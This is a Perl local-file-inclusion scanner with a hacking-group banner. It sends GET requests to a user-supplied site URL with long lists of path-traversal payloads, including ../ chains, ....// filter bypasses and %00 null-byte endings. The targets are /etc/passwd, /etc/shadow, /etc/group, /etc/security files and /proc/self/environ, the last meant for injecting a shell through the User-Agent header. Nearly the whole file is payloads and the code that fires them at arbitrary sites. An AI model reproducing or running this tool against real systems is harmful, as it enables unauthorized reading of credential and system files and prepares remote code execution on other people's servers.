#!/usr/bin/perl

    use HTTP::Request;
    use LWP::UserAgent;
system("title Pixel-Code");
system("color 1e");
system ("cls");
print " ___                _     _____ _ _         \n";
print "|   |   ___ ___ ___| |___|   __|_| |___     \n";
print "|   |__| . |  _| .'| |___|   __| | | -_|    \n";
print "|______|___|___|__,|_|   |__|  |_|_|___|    \n";
print " _____         _         _           __     \n";
print "|     |___ ___| |_ _ ___|_|___ ___  |  |    \n";
print "|-   -|   |  _| | | |_ -| | . |   | |__|    \n";
print "|_____|_|_|___|_|___|___|_|___|_|_| |__|    \n";
print "[!]Local-File Inclusion Scanner with Perl~  \n";
print "[!]Keep Learn And Happy Hacking!\n";
print "[!]Site: https://www.Pixel-Code.ga\n";
print "[!]Greetz: CyBeRiZM.Org & Kaizen\n";
sleep (1);
print "\n";
menu:;
print "Menu:\n";
print " ID [1] => Passwd,Log";
print "[Scan Files Of /etc/ Directory]\n";
print " ID [2] => Environ";
print "[Scan Environ File For Inject Shell By U-Agent]\n";
print"\n";
print " Select ID For Start Scanner :";
$menu = <>;
if ($menu =~ /1/){
        goto lfi;
        }
        if ($menu =~ /2/){
                goto env;
        }
        else {
                print"\n\n";
                print "\t\tUnknown Command :(\n";
                goto menu;
        };


lfi:;
    print "\n\n";
    print "\t\t\tWelcome To Local-File Inclusion With New Method\n\n";
    print "\t Insert Target (ex: http://www.site.com/index.php?page=)\n";
    print "\t Target :";
    $host=<STDIN>;
    chomp($host);
    if($host !~ /http:\/\//) { $host = "http://$host"; };

print "\n\n";
print "\t\t\t*-*-*-*-*-* Start Scanning Section *-*-*-*-*-*\n";
print "\n\n";
@lfi = ('../etc/passwd',
'../../etc/passwd',
'../../../etc/passwd',
'../../../../etc/passwd',
'../../../../../etc/passwd',
'../../../../../../etc/passwd',
'../../../../../../../etc/passwd',
'../../../../../../../../etc/passwd',
'../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../etc/passwd',
'....//etc/passwd',
'....//....//etc/passwd',
'....//....//....//etc/passwd',
'....//....//....//....//etc/passwd',
'....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//....//etc/passwd',
'../../etc/passwd%00',
'../../../etc/passwd%00',
'../../../../etc/passwd%00',
'../../../../../etc/passwd%00',
'../../../../../../etc/passwd%00',
'../../../../../../../etc/passwd%00',
'../../../../../../../../etc/passwd%00',
'../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../etc/passwd%00',
'....//etc/passwd%00',
'....//....//etc/passwd%00',
'....//....//....//etc/passwd%00',
'....//....//....//....//etc/passwd%00',
'....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//....//etc/passwd%00',
'../etc/shadow',
'../../etc/shadow',
'../../../etc/shadow',
'../../../../etc/shadow',
'../../../../../etc/shadow',
'../../../../../../etc/shadow',
'../../../../../../../etc/shadow',
'../../../../../../../../etc/shadow',
'../../../../../../../../../etc/shadow',
'../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../../etc/shadow',
'../etc/shadow%00',
'../../etc/shadow%00',
'../../../etc/shadow%00',
'../../../../etc/shadow%00',
'../../../../../etc/shadow%00',
'../../../../../../etc/shadow%00',
'../../../../../../../etc/shadow%00',
'../../../../../../../../etc/shadow%00',
'../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../../etc/shadow%00',
'../etc/group',
'../../etc/group',
'../../../etc/group',
'../../../../etc/group',
'../../../../../etc/group',
'../../../../../../etc/group',
'../../../../../../../etc/group',
'../../../../../../../../etc/group',
'../../../../../../../../../etc/group',
'../../../../../../../../../../etc/group',
'../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../../etc/group',
'../etc/group%00',
'../../etc/group%00',
'../../../etc/group%00',
'../../../../etc/group%00',
'../../../../../etc/group%00',
'../../../../../../etc/group%00',
'../../../../../../../etc/group%00',
'../../../../../../../../etc/group%00',
'../../../../../../../../../etc/group%00',
'../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../../etc/group%00',
'../etc/security/group',
'../../etc/security/group',
'../../../etc/security/group',
'../../../../etc/security/group',
'../../../../../etc/security/group',
'../../../../../../etc/security/group',
'../../../../../../../etc/security/group',
'../../../../../../../../etc/security/group',
'../../../../../../../../../etc/security/group',
'../../../../../../../../../../etc/security/group',
'../../../../../../../../../../../etc/security/group',
'../etc/security/group%00',
'../../etc/security/group%00',
'../../../etc/security/group%00',
'../../../../etc/security/group%00',
'../../../../../etc/security/group%00',
'../../../../../../etc/security/group%00',
'../../../../../../../etc/security/group%00',
'../../../../../../../../etc/security/group%00',
'../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../../etc/security/group%00',
'../etc/security/passwd',
'../../etc/security/passwd',
'../../../etc/security/passwd',
'../../../../etc/security/passwd',
'../../../../../etc/security/passwd',
'../../../../../../etc/security/passwd',
'../../../../../../../etc/security/passwd',
'../../../../../../../../etc/security/passwd',
'../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../../etc/security/passwd',
'../etc/security/passwd%00',
'../../etc/security/passwd%00',
'../../../etc/security/passwd%00',
'../../../../etc/security/passwd%00',
'../../../../../etc/security/passwd%00',
'../../../../../../etc/security/passwd%00',
'../../../../../../../etc/security/passwd%00',
'../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../../etc/security/passwd%00',
'../etc/security/user',
'../../etc/security/user',
'../../../etc/security/user',
'../../../../etc/security/user',
'../../../../../etc/security/user',
'../../../../../../etc/security/user',
'../../../../../../../etc/security/user',
'../../../../../../../../etc/security/user',
'../../../../../../../../../etc/security/user',
'../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../../etc/security/user',
'../etc/security/user%00',
'../../etc/security/user%00',
'../../../etc/security/user%00',
'../../../../etc/security/user%00',
'../../../../../etc/security/user%00',
'../../../../../../etc/security/user%00',
'../../../../../../../etc/security/user%00',
'../../../../../../../../etc/security/user%00',
'../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../../etc/security/user%00');


foreach $scan(@lfi){

$url = $host.$scan;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($request);
if ($response->is_success && $response->content =~ /root:x:/) { $msg = Vulnerability;}
else { $msg = "Not Infected";}
print "$scan..........[$msg]\n";
}
env:;
    print "\n\n";
    print "\t\t\tWelcome To Environ Section\n\n";
    print "\t Insert Target (ex: http://www.site.com/index.php?page=)\n";
    print "\t Target :";
    $host=<STDIN>;
    chomp($host);
    if($host !~ /http:\/\//) { $host = "http://$host"; };

print "\n\n";
print "\t\t*-*-*-*-*-* Start Scanning Environ  *-*-*-*-*-*\n";
print "\n\n";

@env = ('../proc/self/environ',
'../../proc/self/environ',
'../../../proc/self/environ',
'../../../../proc/self/environ',
'../../../../../proc/self/environ',
'../../../../../../proc/self/environ',
'../../../../../../../proc/self/environ',
'../../../../../../../../proc/self/environ',
'../../../../../../../../../proc/self/environ',
'../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../proc/self/environ',
'../proc/self/environ%00',
'../../proc/self/environ%00',
'../../../proc/self/environ%00',
'../../../../proc/self/environ%00',
'../../../../../proc/self/environ%00',
'../../../../../../proc/self/environ%00',
'../../../../../../../proc/self/environ%00',
'../../../../../../../../proc/self/environ%00',
'../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../proc/self/environ%00');

foreach $scan_env(@env){

$url = $host.$scan_env;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($request);
if ($response->is_success && $response->content =~ /HTTP_ACCEPT/ && $response->content =~ /HTTP_HOST/) { $msg = Vulnerability;}
else { $msg = "Not Infected";}
print "$scan_env..........[$msg]\n";
}
